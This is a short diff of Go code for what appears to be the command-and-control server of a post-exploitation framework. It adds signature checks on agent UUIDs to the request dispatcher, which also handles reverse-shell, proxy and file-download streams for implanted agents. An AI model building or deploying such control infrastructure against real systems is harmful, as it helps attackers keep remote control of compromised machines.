@@ -3,9 +3,9 @@
 
 package cc
 
-
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -100,14 +100,40 @@ func TLSServer() {
 func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 	vars := mux.Vars(req)
 
+	// H2Conn for reverse shell and proxy
 	var rshellConn, proxyConn emp3r0r_data.H2Conn
 	RShellStream.H2x = &rshellConn
 	ProxyStream.H2x = &proxyConn
 
-	token := vars["token"]
-	// POST vars
-	var path string
-	path = req.URL.Query().Get("file_to_download")
+	// vars
+	if vars["api"] == "" || vars["token"] == "" {
+		CliPrintDebug("Invalid request: %v, no api/token found, abort", req)
+		wrt.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	// verify agent uuid, is it signed by our CA?
+	agent_uuid := req.Header.Get("AgentUUID")
+	agent_sig, err := base64.URLEncoding.DecodeString(req.Header.Get("AgentUUIDSig"))
+	if err != nil {
+		CliPrintDebug("Failed to decode agent sig: %v, abort", err)
+		wrt.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	isValid, err := tun.VerifySignatureWithCA([]byte(agent_uuid), agent_sig)
+	if err != nil {
+		CliPrintDebug("Failed to verify agent uuid: %v", err)
+	}
+	if !isValid {
+		CliPrintDebug("Invalid agent uuid, refusing request")
+		wrt.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	CliPrintDebug("Header: %v", req.Header)
+	CliPrintDebug("Got a request: api=%s, token=%s, agent_uuid=%s, sig=%x",
+		vars["api"], vars["token"], agent_uuid, agent_sig)
+
+	token := vars["token"] // this will be used to authenticate some requests
 
 	api := tun.WebRoot + "/" + vars["api"]
 	switch api {
@@ -129,6 +155,9 @@ func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 		wrt.WriteHeader(http.StatusBadRequest)
 
 	case tun.FileAPI:
+		var path string
+		path = req.URL.Query().Get("file_to_download")
+
 		if !IsAgentExistByTag(token) {
 			wrt.WriteHeader(http.StatusBadRequest)
 			return
